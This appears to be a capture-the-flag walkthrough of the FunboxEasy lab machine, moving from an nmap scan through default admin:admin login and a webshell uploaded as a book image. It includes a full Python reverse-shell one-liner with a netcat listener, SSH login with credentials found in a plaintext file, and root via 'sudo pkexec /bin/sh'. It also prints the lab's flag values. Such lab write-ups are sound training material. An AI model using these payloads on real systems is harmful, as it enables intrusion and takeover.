@@ -1,0 +1,220 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 10.0.2.41<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/FunboxEasy]<br/>
+└─# nmap -sC -sV 10.0.2.41 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 17:56 +0630<br/>
+Nmap scan report for 10.0.2.41<br/>
+Host is up (0.00014s latency).<br/>
+Not shown: 65532 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; &nbsp;STATE SERVICE VERSION<br/>
+22/tcp &nbsp; &nbsp;open &nbsp;ssh &nbsp; &nbsp; OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 3072 b2d8516ec584051908ebc8582713132f (RSA)<br/>
+| &nbsp; 256 b0de9703a72ff4e2ab4a9cd9439b8a48 (ECDSA)<br/>
+|_ &nbsp;256 9d0f9a26384f0180a7a6809dd1d4cfec (ED25519)<br/>
+80/tcp &nbsp; &nbsp;open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.41 ((Ubuntu))<br/>
+| http-robots.txt: 1 disallowed entry <br/>
+|_gym<br/>
+|_http-title: Apache2 Ubuntu Default Page: It works<br/>
+|_http-server-header: Apache/2.4.41 (Ubuntu)<br/>
+33060/tcp open &nbsp;mysqlx?<br/>
+| fingerprint-strings: <br/>
+| &nbsp; DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: <br/>
+| &nbsp; &nbsp; Invalid message"<br/>
+|_ &nbsp; &nbsp;HY000<br/>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br/>
+SF-Port33060-TCP:V=7.93%I=7%D=2/27%Time=63FC9389%P=x86_64-pc-linux-gnu%r(N<br/>
+SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\<br/>
+SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp<br/>
+SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b<br/>
+SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers<br/>
+SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2<br/>
+SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI<br/>
+SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")<br/>
+SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01<br/>
+SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie<br/>
+SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x<br/>
+SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"<br/>
+SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9<br/>
+SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\<br/>
+SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0<br/>
+SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,<br/>
+SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0<br/>
+SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\<br/>
+SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions<br/>
+SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x<br/>
+SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"<br/>
+SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1<br/>
+SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000<br/>
+SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0<br/>
+SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r<br/>
+SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0<br/>
+SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\<br/>
+SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");<br/>
+MAC Address: 08:00:27:52:B4:F5 (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 23.98 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I Got Reverse Shell from (http://10.0.2.41/store/)<br/>
+<br/>
+Step 1:<br/>
+<br/>
+Login with common credential admin:admin. Now, I am at admin dashboard.<br/>
+<br/>
+Step 2:<br/>
+<br/>
+click "Add new book" fill the form with whatever information you like except "Publisher" Publisher name should be valid name so I use one of publisher name and upload my webshell from "image". After filling all the information, click "Add new book". Boom! successfully added new book.<br/>
+<br/>
+Step 3:<br/>
+<br/>
+Access webshell from new added book.<br/>
+<br/>
+http://10.0.2.41/store/book.php?bookisbn=11<br/>
+<br/>
+Right-click photo location and click "Open Image In New Tab". Boom! Now, you got webshell.<br/>
+<br/>
+http://10.0.2.41/store/bootstrap/img/__welcome.php<br/>
+<br/>
+Step 4:<br/>
+<br/>
+In webshell terminal, copy and paste python reverse shell payload from https://www.revshells.com/<br/>
+<br/>
+payload - python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'<br/>
+<br/>
+Listen with netcat <br/>
+<br/>
+nc -lvnp 4444<br/>
+<br/>
+Step 5:<br/>
+<br/>
+Boom! I got reverse shell.<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+listening on [any] 4444 ...<br/>
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.41] 33734<br/>
+$ whoami<br/>
+whoami<br/>
+www-data<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Got ssh username "tony" and his password "yxcvbnmYYY" from his home directory password.txt<br/>
+<br/>
+www-data@funbox3:/home/tony$ cat password.txt <br/>
+ssh: yxcvbnmYYY<br/>
+gym/admin: asdfghjklXXX<br/>
+/store: admin@admin.com admin<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Login ssh with tony password:<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ssh tony@10.0.2.41 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+The authenticity of host '10.0.2.41 (10.0.2.41)' can't be established.<br/>
+ED25519 key fingerprint is SHA256:sMY2EwBNywi3V/cmpdMCtvcC6NM31k0H9CTRlsxALfY.<br/>
+This key is not known by any other names<br/>
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>
+Warning: Permanently added '10.0.2.41' (ED25519) to the list of known hosts.<br/>
+tony@10.0.2.41's password: <br/>
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)<br/>
+<br/>
+&nbsp;* Documentation: &nbsp;https://help.ubuntu.com<br/>
+&nbsp;* Management: &nbsp; &nbsp; https://landscape.canonical.com<br/>
+&nbsp;* Support: &nbsp; &nbsp; &nbsp; &nbsp;https://ubuntu.com/advantage<br/>
+<br/>
+&nbsp; System information as of Mon Feb 27 11:53:45 UTC 2023<br/>
+<br/>
+&nbsp; System load: &nbsp;0.22 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Processes: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 123<br/>
+&nbsp; Usage of /: &nbsp; 76.1% of 4.66GB &nbsp; Users logged in: &nbsp; &nbsp; &nbsp; &nbsp; 0<br/>
+&nbsp; Memory usage: 61% &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IPv4 address for enp0s3: 10.0.2.41<br/>
+&nbsp; Swap usage: &nbsp; 0%<br/>
+<br/>
+&nbsp;* Are you ready for Kubernetes 1.19? It's nearly here! Try RC3 with<br/>
+&nbsp; &nbsp;sudo snap install microk8s --channel=1.19/candidate --classic<br/>
+<br/>
+&nbsp; &nbsp;https://www.microk8s.io/ has docs and details.<br/>
+<br/>
+61 updates can be installed immediately.<br/>
+0 of these updates are security updates.<br/>
+To see these additional updates run: apt list --upgradable<br/>
+<br/>
+<br/>
+The list of available updates is more than a week old.<br/>
+To check for new updates run: sudo apt update<br/>
+<br/>
+Last login: Fri Jul 31 15:46:21 2020 from 192.168.178.143<br/>
+tony@funbox3:~$ whoami<br/>
+tony<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation (sudo -l /usr/bin/pkexec)<br/>
+<br/>
+I execute sudo -l command and found so many binary file that can use as root with sudo:<br/>
+<br/>
+tony@funbox3:~$ sudo -l<br/>
+Matching Defaults entries for tony on funbox3:<br/>
+&nbsp; &nbsp; env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br/>
+<br/>
+User tony may run the following commands on funbox3:<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/yelp<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/dmf<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/whois<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/rlogin<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/pkexec<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/mtr<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/finger<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/time<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /usr/bin/cancel<br/>
+&nbsp; &nbsp; (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh<br/>
+<br/>
+<br/>
+<br/>
+So, I abusive pkexec for root access:<br/>
+<br/>
+https://gtfobins.github.io/gtfobins/pkexec/#sudo<br/>
+<br/>
+tony@funbox3:/usr/bin$ sudo pkexec /bin/sh<br/>
+# whoami<br/>
+root<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Vulnhub Flags<br/>
+<br/>
+<br/>
+root@funbox3:~# cat root.flag<br/>
+&nbsp;__________ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;___. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;___________ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+\_ &nbsp; _____/_ __ &nbsp;____\_ |__ &nbsp; _______ &nbsp;___ /\ &nbsp;\_ &nbsp; _____/____ &nbsp; &nbsp;_________.__.<br/>
+&nbsp;| &nbsp; &nbsp;__)| &nbsp;| &nbsp;\/ &nbsp; &nbsp;\| __ \ / &nbsp;_ \ &nbsp;\/ &nbsp;/ \/ &nbsp; | &nbsp; &nbsp;__)_\__ &nbsp;\ &nbsp;/ &nbsp;___&lt; &nbsp; | &nbsp;|<br/>
+&nbsp;| &nbsp; &nbsp; \ | &nbsp;| &nbsp;/ &nbsp; | &nbsp;\ \_\ ( &nbsp;&lt;_&gt; &gt; &nbsp; &nbsp;&lt; &nbsp;/\ &nbsp; | &nbsp; &nbsp; &nbsp; &nbsp;\/ __ \_\___ \ \___ &nbsp;|<br/>
+&nbsp;\___ &nbsp;/ |____/|___| &nbsp;/___ &nbsp;/\____/__/\_ \ \/ &nbsp;/_______ &nbsp;(____ &nbsp;/____ &nbsp;&gt;/ ____|<br/>
+&nbsp; &nbsp; &nbsp;\/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \/ &nbsp; &nbsp;\/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \/ &nbsp; &nbsp; \/ &nbsp; &nbsp; \/ \/ &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+Made with ❤ from twitter@0815R2d2. Please, share this on twitter if you want.<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Offensive Security Playground Labs Flags<br/>
+<br/>
+# cat proof.txt<br/>
+a6888fd3b6b2881a36bdf29ec5e46ab3<br/>
+<br/>
+root@funbox3:/home/tony# cat /var/www/local.txt<br/>
+799eab59f55bc2e6ca41c7cb15600bde</body></html>
